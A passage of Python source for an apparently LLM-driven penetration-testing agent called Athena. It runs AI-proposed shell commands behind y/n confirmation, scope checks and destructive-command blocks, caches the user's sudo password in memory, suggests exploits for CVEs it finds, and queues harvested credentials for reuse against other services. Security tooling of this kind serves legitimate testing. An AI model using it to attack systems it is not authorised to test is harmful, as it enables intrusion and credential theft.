        return completion.choices[0].message.content

    def _think_with_fallback(self, messages: list,
                             max_tokens: int = MAX_TOKENS_DEFAULT) -> Optional[str]:
        start_index = self.provider_index
        last_error = None

        for attempt in range(len(PROVIDER_CHAIN)):
            idx = (start_index + attempt) % len(PROVIDER_CHAIN)
            model_id, model_name = PROVIDER_CHAIN[idx]

            try:
                response = self._call_provider(messages, model_id, max_tokens)
                if idx != self.provider_index:
                    self.provider_index = idx
                    print(f"\n\033[33m   ↪ Switched to: {model_name}\033[0m")
                return response

            except Exception as e:
                last_error = e
                err = str(e).lower()
                is_limit = any(x in err for x in [
                    "rate", "limit", "429", "quota",
                    "too many", "queue", "capacity"
                ])
                is_404 = "404" in err or "not_found" in err or "does not exist" in err
                is_cf = "cloudflare" in err

                if is_404:
                    print(f"\033[33m   {model_name} unavailable — skipping\033[0m")
                    continue
                elif is_limit:
                    print(f"\n\033[33m   {model_name} rate-limited — falling to next\033[0m")
                    continue
                elif is_cf:
                    print(f"\n\033[33m   {model_name} blocked by CF — next\033[0m")
                    continue
                else:
                    short = err[:100]
                    print(f"\n\033[31m   {model_name} error: {short}\033[0m")
                    continue

        print(f"\n\033[31m   ⚠  All providers exhausted: {last_error}\033[0m")
        return None

    def _current_model_name(self) -> str:
        if 0 <= self.provider_index < len(PROVIDER_CHAIN):
            return PROVIDER_CHAIN[self.provider_index][1]
        return "Unknown"

    # ── Target setup ──────────────────────────────────────────────

    def set_target(self):
        print()
        say_athena("Set target. Enter to skip any field.")
        print()
        try:
            ip     = input("   IP / CIDR range : ").strip()
            domain = input("   Domain / URL    : ").strip()
            notes  = input("   Mission notes   : ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return

        self.target_info = {
            "ip":     ip or None,
            "domain": domain or None,
            "notes":  notes or None,
        }
        # Refresh the PTT root with the actual goal
        goal = "Compromise " + (ip or domain or "target")
        if notes:
            goal += f" — {notes}"
        self.ptt = PTT(goal=goal)

        if ip or domain:
            summary = " | ".join(filter(None, [ip, domain]))
            print(f"\n\033[32m   Target: {summary}\033[0m")
            self._log(f"[TARGET] {summary} | {notes}")
        else:
            print("\n\033[33m   No target set.\033[0m")

    # ── Command safety gates (carried from v6.1, unchanged) ──────

    def _is_banned(self, cmd: str) -> bool:
        return any(b in cmd.lower() for b in BANNED_COMMANDS)

    def _is_interactive(self, cmd: str) -> Tuple[bool, str]:
        cmd_lower = cmd.lower().strip()
        non_interactive_markers = [
            " -q -r ", " -batch ", " --batch", " -e '", " -c '",
            "sshpass", "<<EOF", "<<<", " -y ", "expect ",
        ]
        if any(m in cmd for m in non_interactive_markers):
            return (False, "")
        for trigger, fix in INTERACTIVE_BLOCKED.items():
            if (cmd_lower.startswith(trigger) or
                f" {trigger}" in cmd_lower or
                f"&& {trigger}" in cmd_lower or
                f"; {trigger}" in cmd_lower):
                # msfconsole with -q -r is fine
                if trigger == "msfconsole" and (" -q -r " in cmd or " -q -x " in cmd):
                    return (False, "")
                return (True, fix)
        return (False, "")

    def _is_destructive(self, cmd: str) -> bool:
        for pattern in DESTRUCTIVE_COMMANDS:
            if re.search(pattern, cmd):
                return True
        return False

    def _needs_double_confirm(self, cmd: str) -> bool:
        for pattern in DOUBLE_CONFIRM:
            if re.search(pattern, cmd):
                return True
        return False

    def _normalize_choice(self, choice: str) -> str:
        c = choice.strip().lower()
        if c in ("y", "yes", "1y", "yy", "yeah", "yep", "ye"):
            return "y"
        if c in ("n", "no", "skip", "nope"):
            return "n"
        if c in ("q", "quit", "exit", "stop"):
            return "q"
        return c

    # ── Command execution (with full y/n gate) ────────────────────

    def _sync_graph_from_recent_findings(self, last_n: int):
        """Push the most recent N findings into the attack graph."""
        if not self.graph._has() or last_n <= 0:
            return
        for f in self.ptt.findings[-last_n:]:
            try:
                if f.ftype == "ip":
                    self.graph.add_host(f.value)
                elif f.ftype == "port":
                    # Port findings often lack host context — try to
                    # associate with the most recently discovered host
                    hosts = [g.value for g in self.ptt.findings if g.ftype == "ip"]
                    host = hosts[-1] if hosts else (
                        self.target_info.get("ip") or "unknown")
                    try:
                        self.graph.add_service(host, int(f.value))
                    except ValueError:
                        pass
                elif f.ftype == "svc":
                    # svc value is usually a software/version string
                    hosts = [g.value for g in self.ptt.findings if g.ftype == "ip"]
                    host = hosts[-1] if hosts else (
                        self.target_info.get("ip") or "unknown")
                    self.graph.add_service(host, 0, name=f.value, version=f.value)
                elif f.ftype == "cred":
                    self.graph.add_credential(f.value, verified=f.verified)
                elif f.ftype in ("hash", "hash_ntlm", "krb_hash", "ntlmv2"):
                    self.graph.add_hash(f.value, htype=f.ftype)
                elif f.ftype == "cve":
                    host = self.target_info.get("ip") or ""
                    self.graph.add_vuln(f.value, host=host)
                elif f.ftype == "domain":
                    pass  # domain nodes optional
            except Exception:
                continue

    def _flush_cred_fanout(self):
        """If credentials are queued, propose verification commands
        against every auth-able service in the PTT.  This is called
        between agent turns — adds PTT subnodes the LLM can pick up."""
        if not self.cred_fanout_queue:
            return
        services = self.graph.auth_services() if self.graph._has() else []
        if not services:
            return
        for cred_value, user in self.cred_fanout_queue[:3]:  # batch
            untested = self.graph.cred_fanout_targets(cred_value)
            if not untested:
                continue
            # Add a PTT branch for this credential's fanout
            parent = self.ptt.find_in_progress() or self.ptt.nodes[self.ptt.root_id]
            fanout_id = self.ptt.add_node(
                parent.nid,
                f"Credential reuse: {cred_value[:24]} → {len(untested)} services",
                phase="credential",
                status="todo",
            )
            print(f"\033[33m   ↳ Cred fanout: queued tests of "
                  f"'{cred_value[:24]}' against {len(untested)} services "
                  f"(node {fanout_id})\033[0m")
        self.cred_fanout_queue.clear()

    # v7.1 — sudo password handling.  Prompted once via getpass at first
    # sudo command; cached in memory; injected via `sudo -S` (read from
    # stdin) for every sudo run.  This works regardless of TTY because
    # we feed the password through subprocess pipes ourselves.
    _sudo_password: Optional[str] = None
    _sudo_skip_session: bool = False  # user opted out

    def _command_needs_sudo(self, cmd: str) -> bool:
        """Detect if a command starts with sudo or contains 'sudo ' as
        a leading token in any pipeline segment."""
        stripped = cmd.lstrip()
        if stripped.startswith("sudo ") or stripped == "sudo":
            return True
        for sep in [" | ", " && ", " || ", "; "]:
            for seg in cmd.split(sep):
                seg = seg.strip()
                if seg.startswith("sudo "):
                    return True
        return False

    def _needs_sudo_retry(self, output: str) -> bool:
        """v7.2 — scan command output for permission-failure markers
        that indicate the command would have worked with sudo.  Used
        to offer a one-tap retry after a non-sudo command fails."""
        if not output:
            return False
        lo = output.lower()
        return any(marker in lo for marker in SUDO_RETRY_MARKERS)

    def _prime_sudo(self) -> bool:
        """Prompt the user for their sudo password ONCE per session
        (via getpass, no echo) and store it in memory.  After this,
        every sudo call gets `-S` injected and the password fed via
        stdin pipe.  Returns False if the user opts out or auth fails.
        """
        if self._sudo_skip_session:
            return False
        if self._sudo_password is not None:
            # Already cached — verify it still works
            ok = self._sudo_test()
            if ok:
                return True
            # Stale, re-prompt
            self._sudo_password = None

        say_sys("🔐 SUDO required — caching password in memory for this session", color="33")
        say_dim("(stored in RAM only, never written to disk; used via `sudo -S`)")
        try:
            pw = getpass.getpass("   sudo password (or empty to skip): ")
        except (EOFError, KeyboardInterrupt):
            print()
            self._sudo_skip_session = True
            return False
        if not pw:
            self._sudo_skip_session = True
            say_dim("Skipped — Athena will avoid sudo for this session.")
            return False

        # Validate by running `sudo -S -v` with the password piped in
        self._sudo_password = pw
        if self._sudo_test():
            say_ok("sudo password accepted, cached in memory.")
            return True
        else:
            say_err("sudo authentication failed — clearing cached password.")
            self._sudo_password = None
            return False

    def _sudo_test(self) -> bool:
        """Verify the cached password by running `sudo -S -v`."""
        if not self._sudo_password:
            return False
        try:
            r = subprocess.run(
                ["sudo", "-S", "-v"],
                input=self._sudo_password + "\n",
                capture_output=True,
                text=True,
                timeout=10,
            )
            return r.returncode == 0
        except Exception:
            return False

    def _wrap_sudo_with_password(self, cmd: str) -> str:
        """Transform every leading `sudo ` in the command into
        `sudo -S ` so it reads the password from stdin.  We feed the
        password via the subprocess `input` parameter at exec time."""
        if not self._sudo_password:
            return cmd
        # Replace `sudo ` with `sudo -S ` — but only as a leading token,
        # not e.g. `--sudo foo`.  Match start-of-string or after a
        # pipeline separator.
        def _sub(s: str) -> str:
            s = s.lstrip()
            if s.startswith("sudo -S "):
                return s  # already wrapped
            if s.startswith("sudo ") or s == "sudo":
                return "sudo -S " + s[5:] if s.startswith("sudo ") else "sudo -S"
            return s
        # Handle pipelines/sequences
        out_parts: List[str] = []
        # Split on bash separators while keeping them
        parts = re.split(r'(\s\|\s|\s&&\s|\s\|\|\s|;\s)', cmd)
        for p in parts:
            if p.strip() in ("|", "&&", "||", ";"):
                out_parts.append(p)
            else:
                out_parts.append(_sub(p))
        return "".join(out_parts)

    def run_command(self, cmd: str, label: str = "EXEC") -> str:
        if self._is_destructive(cmd):
            print()
            print(error_alert(
                "DESTRUCTIVE COMMAND REFUSED", cmd,
                hint="Athena will not run anything that wipes data, "
                     "kills the system, or creates fork bombs."))
            self._log(f"[DESTRUCTIVE REFUSED] {cmd}")
            return EXEC_DESTRUCTIVE

        # v7.1 — scope / RoE check
        target_hint = (self.target_info.get("ip") or
                       self.target_info.get("domain") or "")
        scope_ok, scope_reason = self.scope.check(cmd, target_hint=target_hint)
        if not scope_ok:
            print()
            print(error_alert(
                "OUT OF SCOPE — REFUSED",
                f"{cmd}\n\nReason: {scope_reason}",
                hint=f"Edit ~/.athena/scope.json to adjust engagement scope."))
            self._log(f"[OUT-OF-SCOPE] {cmd} -- {scope_reason}")
            return EXEC_REJECTED

        is_interactive, fix = self._is_interactive(cmd)
        if is_interactive:
            print()
            print(error_alert(
                "INTERACTIVE COMMAND BLOCKED", cmd,
                hint=f"Fix: {fix}"))
            self._log(f"[INTERACTIVE BLOCKED] {cmd}")
            return EXEC_INTERACTIVE_BLOCKED

        # v7.1 — MITRE ATT&CK pre-tag for the command itself
        attack_tag = attack_id_for_command(cmd)
        attack_label = ""
        if attack_tag:
            tid, tname, tactic = attack_tag
            attack_label = f"  \033[36m▸ {tid} {tname}\033[0m"
            # Track in session-wide technique counter
            if tid not in self.attack_techniques_used:
                self.attack_techniques_used[tid] = {
                    "name": tname, "tactic": tactic, "count": 0, "commands": []
                }
            self.attack_techniques_used[tid]["count"] += 1
            self.attack_techniques_used[tid]["commands"].append(cmd[:120])

        # v7.2 — boxed command card.  Shows the command, ATT&CK tag,
        # and confidence pill all in one panel.  Replaces the v7.1
        # inline rail.
        is_verify = (label == "VERIFY")
        att_id = attack_tag[0] if attack_tag else ""
        att_name = attack_tag[1] if attack_tag else ""
        # Pull the most recent confidence captured by think_turn for the
        # active node (defaults to green if unknown).
        active_for_conf = self.ptt.find_in_progress()
        conf = active_for_conf.confidence if active_for_conf else "green"
        # If we've failed N times on this node, override to red
        if active_for_conf and active_for_conf.attempts >= 2 and conf == "green":
            conf = "yellow"
        if active_for_conf and active_for_conf.attempts >= NODE_ATTEMPT_LIMIT - 1:
            conf = "red"
        print()
        print(command_card(cmd, conf=conf, attack_id=att_id,
                           attack_name=att_name, verify=is_verify))
        print()
        self._log(f"\n[CMD-{label}]{' '+att_id if att_id else ''}\n{cmd}")

        try:
            raw = input(
                f"   {kbd('y')} run   {kbd('n')} skip   {kbd('q')} quit  › "
            )
        except (EOFError, KeyboardInterrupt):
            print()
            return EXEC_SESSION_EXIT

        choice = self._normalize_choice(raw)
        if choice == "q":
            return EXEC_SESSION_EXIT
        if choice != "y":
            print("\033[90m   Skipped.\033[0m")
            self._log("[SKIPPED]")
            return EXEC_REJECTED

        # Double-confirm for system-modifying commands
        if self._needs_double_confirm(cmd):
            print(f"\n\033[33m   ⚠  This modifies system state. Confirm again.\033[0m")
            try:
                second = input("\033[33m   Really execute? [y/n]: \033[0m")
            except (EOFError, KeyboardInterrupt):
                return EXEC_REJECTED
            if self._normalize_choice(second) != "y":
                print("\033[90m   Cancelled.\033[0m")
                self._log("[DOUBLE CONFIRM CANCELLED]")
                return EXEC_REJECTED

        # v7.1 — if command uses sudo, prime the credential cache and
        # transform `sudo X` → `sudo -S X` so the cached password can
        # be fed via stdin.  Works regardless of TTY.
        actual_cmd = cmd
        sudo_pw_input: Optional[str] = None
        if self._command_needs_sudo(cmd):
            if not self._prime_sudo():
                self._log("[SUDO REJECTED]")
                return EXEC_REJECTED
            actual_cmd = self._wrap_sudo_with_password(cmd)
            sudo_pw_input = (self._sudo_password or "") + "\n"

        # v7.2 — pick a timeout based on the command pattern.  Long
        # scans get a generous ceiling; everything else caps at 5 min
        # so a hanging command can't lock the session forever.
        cmd_timeout = DEFAULT_COMMAND_TIMEOUT
        for pat, t in COMMAND_TIMEOUTS:
            if re.search(pat, cmd, re.IGNORECASE):
                cmd_timeout = t
                break

        print()
        print(f"   \033[100m\033[97m\033[1m  ▶ EXECUTING  \033[0m  "
              f"\033[90m\033[3mtimeout={cmd_timeout}s · "
              f"Ctrl+C aborts this command only\033[0m\n")
        output_lines = []
        proc = None
        timed_out = False
        is_exploit = any(kw in cmd.lower() for kw in
                        ["exploit", "msfconsole", "searchsploit -m",
                         "msfvenom", "/tmp/exploit.rc"])

        try:
            # If sudo password is needed, we have to feed it via stdin.
            # Otherwise we use stdin=DEVNULL so commands that read stdin
            # (e.g. ssh) fail fast instead of hanging forever.
            popen_kwargs = dict(
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                preexec_fn=os.setsid,
            )
            if sudo_pw_input is not None:
                popen_kwargs["stdin"] = subprocess.PIPE
            else:
                popen_kwargs["stdin"] = subprocess.DEVNULL

            proc = subprocess.Popen(actual_cmd, **popen_kwargs)
            if sudo_pw_input is not None and proc.stdin:
                try:
                    proc.stdin.write(sudo_pw_input)
                    proc.stdin.flush()
                    proc.stdin.close()
                except Exception:
                    pass

            # v7.2 — non-blocking read loop bounded by cmd_timeout.
            start_t = time.time()
            for line in iter(proc.stdout.readline, ""):
                # Strip the password-prompt line if it leaks through stderr
                if line.strip().startswith("[sudo] password for"):
                    continue
                print(line, end="")
                output_lines.append(line)
                if (time.time() - start_t) > cmd_timeout:
                    timed_out = True
                    break
            if timed_out:
                # Kill the process group cleanly
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                output_lines.append(f"\n[COMMAND TIMED OUT after {cmd_timeout}s — killed]\n")
                print(f"\n\033[31m   ⏱  Command timed out at {cmd_timeout}s "
                      f"and was killed.\033[0m")
            else:
                proc.wait()
        except KeyboardInterrupt:
            print("\n\033[33m   Command aborted by user — returning to Athena\033[0m")
            if proc:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    proc.wait(timeout=2)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            output_lines.append("\n[COMMAND ABORTED BY USER]\n")
        except Exception as e:
            err = f"EXECUTION ERROR: {e}"
            print(f"\033[31m{err}\033[0m")
            return err

        raw_output = "".join(output_lines)
        rc = proc.returncode if proc else -1

        # v7.2 — if command failed with a permissions/raw-socket marker
        # AND wasn't already wrapped in sudo, offer a one-tap retry.
        if (rc != 0 and not self._command_needs_sudo(cmd)
                and self._needs_sudo_retry(raw_output)
                and not self._sudo_skip_session):
            print()
            print(error_alert(
                "PERMISSION DENIED — needs root",
                f"`{cmd[:160]}` failed without sudo.",
                hint="Press y to re-run prefixed with sudo (one-time, "
                     "uses cached password)."))
            try:
                ans = input(f"   {kbd('y')} retry as sudo   {kbd('n')} keep failure  › ")
            except (EOFError, KeyboardInterrupt):
                ans = "n"
            if self._normalize_choice(ans) == "y":
                # Recursively run the sudo-prefixed version through the
                # same gate.  We tag the label so the agent loop knows
                # this isn't a fresh proposal.
                say_sys("retrying with sudo prefix…", color="33")
                return self.run_command("sudo " + cmd, label=label + "-SUDO")

        # Auto-CVE lookup on recon-type commands
        if any(kw in cmd for kw in ["nmap", "whatweb", "smbclient",
                                      "nikto", "searchsploit", "nuclei",
                                      "nxc ", "crackmapexec"]):
            cve_extra = auto_cve_lookup(raw_output)
            if cve_extra:
                print(cve_extra)
                # Add to context, but DON'T parse this as findings
                # (those CVEs already came from real output)

        # Auto-exploit suggestion when CVE found
        cve_matches = re.findall(r'CVE-\d{4}-\d+', raw_output, re.IGNORECASE)
        if cve_matches:
            target = (self.target_info.get("ip") or
                      self.target_info.get("domain") or "TARGET")
            for cve in cve_matches[:2]:
                expl = analyze_and_suggest_exploit(cve, target, self.lhost)
                if expl:
                    print(expl)

        self._log(f"[OUTPUT]\n{raw_output}")

        # Source-tagged finding extraction — ONLY on raw subprocess output
        active = self.ptt.find_in_progress()
        active_id = active.nid if active else self.ptt.root_id
        findings_before = len(self.ptt.findings)
        new_count = extract_findings_from_stdout(
            raw_output, source_cmd=cmd, ptt=self.ptt,
            active_node_id=active_id,
        )
        if new_count > 0:
            # v7.2 — boxed findings card with the actual extracted values
            new_findings = self.ptt.findings[findings_before:]
            items = []
            for f in new_findings:
                icon_map = {
                    "ip": "🌐", "port": "🔌", "user": "👤",
                    "hash": "🔐", "hash_ntlm": "🔐", "krb_hash": "🎫",
                    "ntlmv2": "🔐", "cred": "🔑", "cve": "💥",
                    "svc": "⚙", "domain": "🏷", "url": "🔗",
                    "exposed_path": "⚠", "smb_share": "📂",
                    "email": "📧", "ssh_key": "🗝", "aws_key": "☁",
                }
                icon = icon_map.get(f.ftype, "•")
                tag = f" \033[36m{f.attack_id}\033[0m" if f.attack_id else ""
                items.append(
                    f"{icon}  \033[97m{f.ftype:<12}\033[0m "
                    f"\033[36m{f.value[:42]}\033[0m{tag}"
                )
            print()
            print(findings_card(new_count, items))
            # v7.1 — feed new findings into attack graph
            self._sync_graph_from_recent_findings(new_count)
            # v7.1 — if creds appeared, queue them for fanout
            for f in self.ptt.findings[-new_count:]:
                if f.ftype == "cred" and (f.value, f.notes) not in self.cred_fanout_queue:
                    self.cred_fanout_queue.append((f.value, f.notes or ""))
                    print(f"\033[33m   ↳ Credential queued for fanout testing: "
                          f"{f.value[:40]}\033[0m")

        # Compress for AI context
        compressed = compress_output_for_history(
            raw_output, is_exploit_result=is_exploit
        )
        if (len(raw_output) > 1000 and
            len(compressed) < len(raw_output) * 0.5):
            print(f"\033[90m   [output compressed: "
                  f"{len(raw_output)}→{len(compressed)} chars for AI]\033[0m")

        return compressed.strip() or "(no output)"

    # ── Verification command (PoC validation) ────────────────────

    def attempt_verification(self, verify_cmd: str,
                             finding_value: str,
                             finding_type: str) -> bool:
        """Run a verify-tagged command through the y/n gate.
        On success (zero exit AND useful output), promote the finding
        to verified=True in the PTT.

        Per operator instruction: ALWAYS goes through y/n gate.
        """
        print()
        print(_box(
            "PoC VERIFICATION",
            [f"  Claim: \033[97m{finding_type}={finding_value[:48]}\033[0m",
             f"  Verifier will attempt to confirm this is real."],
            color="31"))

        result = self.run_command(verify_cmd, label="VERIFY")
        if result in (EXEC_REJECTED, EXEC_DESTRUCTIVE,
                      EXEC_INTERACTIVE_BLOCKED, EXEC_SESSION_EXIT):
            return result == EXEC_SESSION_EXIT and False or False

        # Heuristic: verify command output should NOT contain auth-failure
        # markers and SHOULD be non-empty.
        result_lower = result.lower()
        fail_markers = [
            "permission denied", "authentication failed", "access denied",
            "login incorrect", "invalid", "401", "403", "unauthorized",
            "could not connect", "connection refused", "connection timed",
            "not found", "no such", "command not found",
        ]
        if any(m in result_lower for m in fail_markers):
            print()
            print(_box(
                "✗ VERIFICATION FAILED",
                [f"  {finding_type}={finding_value[:48]} stays unverified"],
                color="31"))
            return False

        if not result.strip() or result.strip() == "(no output)":
            print()
            print(_box(
                "? VERIFICATION INCONCLUSIVE",
                ["  Empty output. Try a different verifier."],
                color="33"))
            return False

        # Promote finding to verified
        for f in self.ptt.findings:
            if f.ftype == finding_type and f.value == finding_value:
                f.verified = True
                f.notes = f"Verified by: {verify_cmd[:120]}"
                print(f"\033[32m   ✓ VERIFIED — "
                      f"{finding_type}={finding_value} confirmed real\033[0m")
                # v7.1 — sync to attack graph
                if finding_type == "cred" and self.graph._has():
                    # Try to extract host:port from verify_cmd
                    host_match = re.search(
                        r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', verify_cmd)
                    port_match = re.search(r':(\d{2,5})\b', verify_cmd)
                    if host_match:
                        host = host_match.group(1)
                        port = int(port_match.group(1)) if port_match else 0
                        self.graph.mark_cred_verified_on(finding_value, host, port)
                return True

        return False

    # ── Specialist agent dispatch ────────────────────────────────

    def _select_agent(self, node: Optional[PTTNode],
                      free_form: str = "") -> str:
        """Deterministic dispatcher: PTT node phase → specialist role."""
        if node and node.phase in PHASE_TO_AGENT:
            return PHASE_TO_AGENT[node.phase]

        # Fallback: keyword scan over free-form text
        lower = (free_form or "").lower()
        if any(k in lower for k in ["http", "web", "url", "browser", "api"]):
            return "web"
        if any(k in lower for k in ["smb", "kerberos", "domain", "ldap",
                                      "active directory", "ad "]):
            return "ad"
        if any(k in lower for k in ["sudo", "suid", "linux", "/etc",
                                     "linpeas", "kernel"]):
            return "linux_privesc"
        if any(k in lower for k in ["windows", "powershell", "winpeas",
                                     "potato", "service"]):
            return "windows_privesc"
        if any(k in lower for k in ["hash", "crack", "spray", "credential",
                                     "password"]):
            return "credential"
        if any(k in lower for k in ["exfil", "tunnel", "pivot"]):
            return "exfil"
        return "recon"

    # ── Two-pass thinking turn ───────────────────────────────────

    def think_turn(self, prompt: str,
                   workflow_key: Optional[str] = None) -> Dict[str, Any]:
        """Single specialist turn.

        Picks specialist agent based on current PTT node, builds the
        appropriate system prompt, calls the LLM with fallback chain,
        parses the response.

        v7.1: handles [TOOL]/[ARGS] dispatch through ToolBuilder, and
        [NEED] tags trigger up to MAX_NEED_FETCHES re-calls with the
        requested context attached.

        Returns dict with: agent, thought, cmd, tool, args, conf,
        verify, handoff, need.
        """
        active = self.ptt.find_in_progress() or self.ptt.find_next_pending()
        if active and active.status == "todo":
            self.ptt.set_status(active.nid, "in_progress")
            active = self.ptt.nodes[active.nid]

        # v7.1 — let context manager track signals
        self.context_mgr.signal_node_change(active.nid if active else None)
        self.context_mgr.signal_stuck(self.stuck_counter)

        agent_role = self._select_agent(active, free_form=prompt)
        self.current_agent = agent_role

        # The NEED loop: build a minimal prompt; if the LLM emits [NEED],
        # rebuild with the requested attachments and call again, up to
        # MAX_NEED_FETCHES times.
        need_attachments: List[str] = []
        parsed: Dict[str, Any] = {}
        for fetch_round in range(MAX_NEED_FETCHES + 1):
            sys_prompt = build_system_prompt(
                agent_role=agent_role,
                target_info=self.target_info,
                ptt=self.ptt,
                active_node=active,
                lhost=self.lhost,
                workflow_key=workflow_key,
                free_form=prompt,
                context_mgr=self.context_mgr,
                graph=self.graph,
                scope=self.scope,
                need_attachments=need_attachments,
            )

            # v7.1 — slice history per context manager
            slice_size = self.context_mgr.history_slice_size()
            # If [NEED]history[/NEED] requested, send the lot
            if "history" in need_attachments:
                slice_size = MAX_HISTORY_MESSAGES
            windowed = self.history[-slice_size:]

            # Compress assistant turns to just their CMD/TOOL block
            compressed_history = []
            for msg in windowed:
                if msg["role"] == "assistant":
                    cm = re.search(r'\[CMD\](.*?)\[/?CMD\]',
                                   msg["content"], re.DOTALL)
                    tm = re.search(r'\[TOOL\](.*?)\[/?TOOL\]',
                                   msg["content"], re.DOTALL)
                    am = re.search(r'\[ARGS\](.*?)\[/?ARGS\]',
                                   msg["content"], re.DOTALL)
                    if tm and am:
                        compressed_history.append({
                            "role": "assistant",
                            "content": (f"[TOOL]{tm.group(1).strip()}[/TOOL]"
                                        f"[ARGS]{am.group(1).strip()}[/ARGS]")
                        })
                    elif cm:
                        compressed_history.append({
                            "role": "assistant",
                            "content": f"[CMD]{cm.group(1).strip()}[/CMD]"
                        })
                    else:
                        compressed_history.append(msg)
                else:
                    compressed_history.append(msg)

            messages = [{"role": "system", "content": sys_prompt}]
            messages.extend(compressed_history)
            messages.append({"role": "user", "content": prompt})

            # Estimate tokens for context savings counter
            sent_size = sum(len(m["content"]) for m in messages)
            full_size_est = sent_size + (
                # estimate of what FULL context would have added
                4000 if not need_attachments else 0
            )
            self.context_mgr.record_savings(full_size_est, sent_size)

            response = self._think_with_fallback(messages,
                                                  max_tokens=MAX_TOKENS_DEFAULT)
            if not response:
                return {"agent": agent_role, "thought": "", "cmd": None,
                        "tool": None, "args": None,
                        "conf": "red", "verify": None, "handoff": None,
                        "need": []}

            parsed = parse_specialist_response(response)
            parsed["agent"] = agent_role

            # If LLM requested more context AND we still have rounds left
            if parsed["need"] and fetch_round < MAX_NEED_FETCHES:
                # Attach the requested context for next round, don't log
                # the [NEED] turn into history (it's a meta-call)
                fresh = [n for n in parsed["need"] if n not in need_attachments]
                if fresh:
                    need_attachments.extend(fresh)
                    print(f"\033[90m   ▸ context-fetch — LLM requested: "
                          f"\033[36m{', '.join(fresh)}\033[0m")
                    continue
            break

        # Only log the FINAL exchange to history (not the NEED-only turns)
        self.history.append({"role": "user", "content": prompt})
        self.history.append({"role": "assistant", "content": response})
        # Trim to MAX_HISTORY_MESSAGES — kept in RAM, only sliced when sending
        if len(self.history) > MAX_HISTORY_MESSAGES * 2:
            self.history = self.history[-(MAX_HISTORY_MESSAGES * 2):]
        self._log(f"[AI:{agent_role}]\n{response}")

        # v7.2 — TOOL dispatch: convert [TOOL]/[ARGS] → shell string.
        # Hard errors are stashed on self._pending_dispatch_error so the
        # agent loop can splice them into the next prompt — that way
        # the LLM actually learns about its bad kwargs instead of
        # looping the same args.
        self._pending_dispatch_error = None
        dispatch_remap_note = ""
        if parsed["tool"]:
            shell, msg = dispatch_tool(parsed["tool"], parsed["args"] or "{}")
            if shell:
                parsed["cmd"] = shell
                if msg and msg.startswith("NOTE:"):
                    dispatch_remap_note = msg
            else:
                # Hard ERROR — feed back to LLM next turn
                self._pending_dispatch_error = (
                    f"Your previous [TOOL]{parsed['tool']}[/TOOL] dispatch "
                    f"failed:\n  {msg}\n"
                    f"Either correct the args, switch tools, or fall back "
                    f"to a [CMD] block."
                )
                if not parsed["cmd"]:
                    parsed["cmd"] = None  # no fallback — agent loop will retry

        # v7.2 — failure-aware confidence.  If we've failed N times
        # already on this node, force a yellow/red regardless of what
        # the LLM said.
        if active and active.attempts >= NODE_ATTEMPT_LIMIT - 1:
            parsed["conf"] = "red"
        elif active and active.attempts >= 2 and parsed["conf"] == "green":
            parsed["conf"] = "yellow"

        # ─── v7.2 BOXED RENDERING ──────────────────────────────────
        target_label = (self.target_info.get("ip") or
                        self.target_info.get("domain") or "no-target")
        self._turn_no = getattr(self, "_turn_no", 0) + 1
        v_count = len(self.ptt.get_verified())
        u_count = len(self.ptt.get_unverified())
        node_label = active.nid if active else "—"
        print()
        print(turn_box(
            turn_no=self._turn_no,
            target=target_label,
            agent_role=agent_role,
            model=self._current_model_name(),
            verified=v_count, unverified=u_count,
            techniques=len(self.attack_techniques_used),
            node_id=node_label,
        ))
        if parsed["thought"]:
            print(thought_card(parsed["thought"], agent_role=agent_role))
        if parsed["tool"] and parsed["cmd"]:
            tool_attack = attack_id_for_command(parsed["cmd"])
            t_id = tool_attack[0] if tool_attack else ""
            t_name = tool_attack[1] if tool_attack else ""
            print(dispatch_card(
                tool=parsed["tool"], shell_str=parsed["cmd"],
                attack_id=t_id, attack_name=t_name,
                remap_note=dispatch_remap_note,
            ))
        elif self._pending_dispatch_error:
            print(error_alert(
                "TOOL DISPATCH FAILED",
                self._pending_dispatch_error,
                hint="The error will be fed back to the AI on the next turn.",
            ))

        if active:
            self.ptt.set_confidence(active.nid, parsed["conf"])

        # v7.1 — feed signals back to context manager
        self.context_mgr.signal_confidence(parsed["conf"])

        return parsed

    # ── PTT seeding from workflow ────────────────────────────────

    def _seed_ptt_from_workflow(self, key: str, target: str):
        wf = WORKFLOWS.get(key)
        if not wf:
            return
        goal = f"{wf['name']}: {target}"
        self.ptt = PTT(goal=goal)
        for title, phase in wf["seed"]:
            self.ptt.add_node(self.ptt.root_id, title, phase, status="todo")

    # ── Stuck recovery ───────────────────────────────────────────

    def _handle_stuck(self):
        """When stuck — ask AI for 3 alternative approaches."""
        print("\n\033[33m   ⚠  Athena is stuck.  Asking AI for 3 alternatives...\033[0m")

        active = self.ptt.find_in_progress() or self.ptt.find_next_pending()
        node_desc = (f"Current node: [{active.nid}] {active.title} "
                     f"(phase={active.phase})") if active else "No active node"

        verified_summary = []
        for f in self.ptt.get_verified()[-10:]:
            verified_summary.append(f"{f.ftype}={f.value}")

        prompt = (
            f"You are stuck.  {node_desc}.\n"
            f"Verified findings: {' | '.join(verified_summary) or 'minimal'}.\n"
            "Output ONLY this format:\n"
            "[OPTIONS]\n"
            "1. <approach 1 — fundamentally different angle, one line>\n"
            "2. <approach 2 — different angle, one line>\n"
            "3. <approach 3 — different angle, one line>\n"
            "[/OPTIONS]\n"
            "Each option must take a totally different approach (e.g. enum vs "
            "exploit vs creds vs pivot vs evasion)."
        )

        response = self._think_with_fallback([
            {"role": "system",
             "content": "You are Athena, listing pivot options when stuck."},
            {"role": "user", "content": prompt},
        ])
        if not response:
            print("\033[31m   AI unavailable.  Type your own next objective.\033[0m")
            return

        m = re.search(r'\[OPTIONS\](.*?)\[/?OPTIONS\]', response, re.DOTALL)
        opts_text = m.group(1).strip() if m else response

        print(f"\n\033[35m   ATHENA — 3 ALTERNATIVES:\033[0m\n")
        print(f"\033[97m{opts_text}\033[0m\n")

        try:
            choice = input(
                "\033[90m   Pick [1/2/3] or type own objective: \033[0m"
            ).strip()
        except (EOFError, KeyboardInterrupt):
            return

        if choice in ("1", "2", "3"):
            for line in opts_text.split('\n'):
                if line.strip().startswith(choice + "."):
